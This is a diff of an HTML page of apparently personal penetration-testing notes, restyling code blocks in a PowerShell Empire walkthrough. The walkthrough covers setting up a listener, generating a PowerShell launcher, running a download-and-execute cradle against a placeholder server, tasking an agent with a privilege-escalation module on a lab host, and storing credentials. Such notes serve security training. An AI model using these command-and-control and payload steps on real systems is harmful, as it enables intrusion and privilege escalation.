@@ -42,6 +42,8 @@
       
     
     
+      <link rel="stylesheet" href="../../../stylesheets/extra.css">
+    
     <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
     
       
@@ -840,87 +842,99 @@
 <h1 id="powershell-empire">Powershell Empire</h1>
 <p>Started using this today, it's really cool. Takes a lot of the work out of finding scripts to run.</p>
 <p>Firing it up:</p>
-<pre><code class="language-bash">/data/reset.sh
-</code></pre>
+<div class="codehilite" style="background: #272822"><pre style="line-height: 125%;"><span></span><code>/data/reset.sh
+</code></pre></div>
+
 <p>Run it with that to reset the database, otherwise it  seems to fail to start, not always though so if you just need to start  it (and it doesn't crash) then do:</p>
-<pre><code class="language-bash">./empire
-</code></pre>
+<div class="codehilite" style="background: #272822"><pre style="line-height: 125%;"><span></span><code>./empire
+</code></pre></div>
+
 <p>Setup a Listener</p>
-<pre><code class="language-bash">listeners
-</code></pre>
+<div class="codehilite" style="background: #272822"><pre style="line-height: 125%;"><span></span><code>listeners
+</code></pre></div>
+
 <p>Once you're inside that menu do:</p>
-<pre><code class="language-bash">uselistener &lt;tab-completion-works-here&gt;
-</code></pre>
+<div class="codehilite" style="background: #272822"><pre style="line-height: 125%;"><span></span><code>uselistener<span style="color: #f8f8f2"> </span>&lt;tab-completion-works-here&gt;
+</code></pre></div>
+
 <p>View options with:</p>
-<pre><code class="language-bash">info
-</code></pre>
+<div class="codehilite" style="background: #272822"><pre style="line-height: 125%;"><span></span><code>info
+</code></pre></div>
+
 <p>Then use set to configure the connection for your IP/Port:</p>
-<pre><code class="language-bash">set Host 10.10.14.3:443
-set Port 443
-</code></pre>
+<div class="codehilite" style="background: #272822"><pre style="line-height: 125%;"><span></span><code><span style="color: #f8f8f2">set </span>Host<span style="color: #f8f8f2"> </span><span style="color: #ae81ff">10</span>.10.14.3:443
+<span style="color: #f8f8f2">set </span>Port<span style="color: #f8f8f2"> </span><span style="color: #ae81ff">443</span>
+</code></pre></div>
+
 <p>For the shell to come back the ports need to match (or so it appears)</p>
 <p>To start the listener:</p>
-<pre><code class="language-bash">execute
-</code></pre>
+<div class="codehilite" style="background: #272822"><pre style="line-height: 125%;"><span></span><code>execute
+</code></pre></div>
+
 <p>Then run:</p>
-<pre><code class="language-bash">launcher powershell
-</code></pre>
+<div class="codehilite" style="background: #272822"><pre style="line-height: 125%;"><span></span><code>launcher<span style="color: #f8f8f2"> </span>powershell
+</code></pre></div>
+
 <p>This will fire back the other half of the shell, which you can execute with IEX(New-Object Net.WebClient)downloadString('http://yoursever/yourfile.ps1')</p>
 <p>Interacting with Agents
 Head back to the main menu using back
 Now type agents to see a list of active agents.
 Get the name of the agent you wish to interact with, and type:</p>
-<pre><code class="language-bash">interact &lt;agent-name&gt;
-(Empire) &gt; interact ASWX9H8G
-(Empire: ASWX9H8G) &gt;
-</code></pre>
+<div class="codehilite" style="background: #272822"><pre style="line-height: 125%;"><span></span><code>interact<span style="color: #f8f8f2"> </span>&lt;agent-name&gt;
+<span style="color: #f92672">(</span>Empire<span style="color: #f92672">)</span><span style="color: #f8f8f2"> </span>&gt;<span style="color: #f8f8f2"> </span>interact<span style="color: #f8f8f2"> </span>ASWX9H8G
+<span style="color: #f92672">(</span>Empire:<span style="color: #f8f8f2"> </span>ASWX9H8G<span style="color: #f92672">)</span><span style="color: #f8f8f2"> </span>&gt;
+</code></pre></div>
+
 <p>Now you can type:</p>
-<pre><code class="language-bash">searchmodule &lt;modulename (not case sensitive)
-</code></pre>
+<div class="codehilite" style="background: #272822"><pre style="line-height: 125%;"><span></span><code>searchmodule<span style="color: #f8f8f2"> </span>&lt;modulename<span style="color: #f8f8f2"> </span><span style="color: #f92672">(</span>not<span style="color: #f8f8f2"> </span><span style="color: #66d9ef">case</span><span style="color: #f8f8f2"> </span>sensitive<span style="color: #f92672">)</span>
+</code></pre></div>
+
 <p>Using Modules
 Once you've found the module you're looking for run:</p>
-<pre><code class="language-bash">usemodule &lt;module-name&gt;
-</code></pre>
-<p>Then type info and hit enter to see the options:</p>
-<pre><code class="language-bash">(Empire: ASWX9H8G) &gt; usemodule privesc/powerup/allchecks
-(Empire: powershell/privesc/powerup/allchecks) &gt; info
+<div class="codehilite" style="background: #272822"><pre style="line-height: 125%;"><span></span><code>usemodule<span style="color: #f8f8f2"> </span>&lt;module-name&gt;
+</code></pre></div>
 
-              Name: Invoke-AllChecks
-            Module: powershell/privesc/powerup/allchecks
-        NeedsAdmin: False
-         OpsecSafe: True
-          Language: powershell
-MinLanguageVersion: 2
-        Background: True
-   OutputExtension: None
+<p>Then type info and hit enter to see the options:</p>
+<div class="codehilite" style="background: #272822"><pre style="line-height: 125%;"><span></span><code><span style="color: #f92672">(</span>Empire:<span style="color: #f8f8f2"> </span>ASWX9H8G<span style="color: #f92672">)</span><span style="color: #f8f8f2"> </span>&gt;<span style="color: #f8f8f2"> </span>usemodule<span style="color: #f8f8f2"> </span>privesc/powerup/allchecks
+<span style="color: #f92672">(</span>Empire:<span style="color: #f8f8f2"> </span>powershell/privesc/powerup/allchecks<span style="color: #f92672">)</span><span style="color: #f8f8f2"> </span>&gt;<span style="color: #f8f8f2"> </span>info
+
+<span style="color: #f8f8f2">              </span>Name:<span style="color: #f8f8f2"> </span>Invoke-AllChecks
+<span style="color: #f8f8f2">            </span>Module:<span style="color: #f8f8f2"> </span>powershell/privesc/powerup/allchecks
+<span style="color: #f8f8f2">        </span>NeedsAdmin:<span style="color: #f8f8f2"> </span>False
+<span style="color: #f8f8f2">         </span>OpsecSafe:<span style="color: #f8f8f2"> </span>True
+<span style="color: #f8f8f2">          </span>Language:<span style="color: #f8f8f2"> </span>powershell
+MinLanguageVersion:<span style="color: #f8f8f2"> </span><span style="color: #ae81ff">2</span>
+<span style="color: #f8f8f2">        </span>Background:<span style="color: #f8f8f2"> </span>True
+<span style="color: #f8f8f2">   </span>OutputExtension:<span style="color: #f8f8f2"> </span>None
 
 Authors:
-  @harmj0y
+<span style="color: #f8f8f2">  </span>@harmj0y
 
 Description:
-  Runs all current checks for Windows privesc vectors.
+<span style="color: #f8f8f2">  </span>Runs<span style="color: #f8f8f2"> </span>all<span style="color: #f8f8f2"> </span>current<span style="color: #f8f8f2"> </span>checks<span style="color: #f8f8f2"> </span><span style="color: #66d9ef">for</span><span style="color: #f8f8f2"> </span>Windows<span style="color: #f8f8f2"> </span>privesc<span style="color: #f8f8f2"> </span>vectors.
 
 Comments:
-  https://github.com/PowerShellEmpire/PowerTools/tree/master/P
-  owerUp
+<span style="color: #f8f8f2">  </span>https://github.com/PowerShellEmpire/PowerTools/tree/master/P
+<span style="color: #f8f8f2">  </span>owerUp
 
 Options:
 
-  Name  Required    Value                     Description
-  ----  --------    -------                   -----------
-  Agent True        ASWX9H8G                  Agent to run module on.
+<span style="color: #f8f8f2">  </span>Name<span style="color: #f8f8f2">  </span>Required<span style="color: #f8f8f2">    </span>Value<span style="color: #f8f8f2">                     </span>Description
+<span style="color: #f8f8f2">  </span>----<span style="color: #f8f8f2">  </span>--------<span style="color: #f8f8f2">    </span>-------<span style="color: #f8f8f2">                   </span>-----------
+<span style="color: #f8f8f2">  </span>Agent<span style="color: #f8f8f2"> </span>True<span style="color: #f8f8f2">        </span>ASWX9H8G<span style="color: #f8f8f2">                  </span>Agent<span style="color: #f8f8f2"> </span>to<span style="color: #f8f8f2"> </span>run<span style="color: #f8f8f2"> </span>module<span style="color: #f8f8f2"> </span>on.
+</code></pre></div>
 
-</code></pre>
 <p>In this case we can just type execute and then hit enter</p>
-<pre><code class="language-bash">(Empire: powershell/privesc/powerup/allchecks) &gt; execute
-[*] Tasked ASWX9H8G to run TASK_CMD_JOB
-[*] Agent ASWX9H8G tasked with task ID 4
-[*] Tasked agent ASWX9H8G to run module powershell/privesc/powerup/allchecks
-(Empire: powershell/privesc/powerup/allchecks) &gt; [*] Agent ASWX9H8G returned results.
-Job started: F9E4KY
-[*] Valid results returned by 10.10.10.81
-Wait a few seconds. And that should output what it managed to find. 
-</code></pre>
+<div class="codehilite" style="background: #272822"><pre style="line-height: 125%;"><span></span><code><span style="color: #f92672">(</span>Empire:<span style="color: #f8f8f2"> </span>powershell/privesc/powerup/allchecks<span style="color: #f92672">)</span><span style="color: #f8f8f2"> </span>&gt;<span style="color: #f8f8f2"> </span>execute
+<span style="color: #f92672">[</span>*<span style="color: #f92672">]</span><span style="color: #f8f8f2"> </span>Tasked<span style="color: #f8f8f2"> </span>ASWX9H8G<span style="color: #f8f8f2"> </span>to<span style="color: #f8f8f2"> </span>run<span style="color: #f8f8f2"> </span>TASK_CMD_JOB
+<span style="color: #f92672">[</span>*<span style="color: #f92672">]</span><span style="color: #f8f8f2"> </span>Agent<span style="color: #f8f8f2"> </span>ASWX9H8G<span style="color: #f8f8f2"> </span>tasked<span style="color: #f8f8f2"> </span>with<span style="color: #f8f8f2"> </span>task<span style="color: #f8f8f2"> </span>ID<span style="color: #f8f8f2"> </span><span style="color: #ae81ff">4</span>
+<span style="color: #f92672">[</span>*<span style="color: #f92672">]</span><span style="color: #f8f8f2"> </span>Tasked<span style="color: #f8f8f2"> </span>agent<span style="color: #f8f8f2"> </span>ASWX9H8G<span style="color: #f8f8f2"> </span>to<span style="color: #f8f8f2"> </span>run<span style="color: #f8f8f2"> </span>module<span style="color: #f8f8f2"> </span>powershell/privesc/powerup/allchecks
+<span style="color: #f92672">(</span>Empire:<span style="color: #f8f8f2"> </span>powershell/privesc/powerup/allchecks<span style="color: #f92672">)</span><span style="color: #f8f8f2"> </span>&gt;<span style="color: #f8f8f2"> </span><span style="color: #f92672">[</span>*<span style="color: #f92672">]</span><span style="color: #f8f8f2"> </span>Agent<span style="color: #f8f8f2"> </span>ASWX9H8G<span style="color: #f8f8f2"> </span>returned<span style="color: #f8f8f2"> </span>results.
+Job<span style="color: #f8f8f2"> </span>started:<span style="color: #f8f8f2"> </span>F9E4KY
+<span style="color: #f92672">[</span>*<span style="color: #f92672">]</span><span style="color: #f8f8f2"> </span>Valid<span style="color: #f8f8f2"> </span>results<span style="color: #f8f8f2"> </span>returned<span style="color: #f8f8f2"> </span>by<span style="color: #f8f8f2"> </span><span style="color: #ae81ff">10</span>.10.10.81
+Wait<span style="color: #f8f8f2"> </span>a<span style="color: #f8f8f2"> </span>few<span style="color: #f8f8f2"> </span>seconds.<span style="color: #f8f8f2"> </span>And<span style="color: #f8f8f2"> </span>that<span style="color: #f8f8f2"> </span>should<span style="color: #f8f8f2"> </span>output<span style="color: #f8f8f2"> </span>what<span style="color: #f8f8f2"> </span>it<span style="color: #f8f8f2"> </span>managed<span style="color: #f8f8f2"> </span>to<span style="color: #f8f8f2"> </span>find.<span style="color: #f8f8f2"> </span>
+</code></pre></div>
+
 <h2 id="credentials">Credentials</h2>
 <p>creds add domain username password</p>
 <p>Use creds to see all stored credentials.</p>
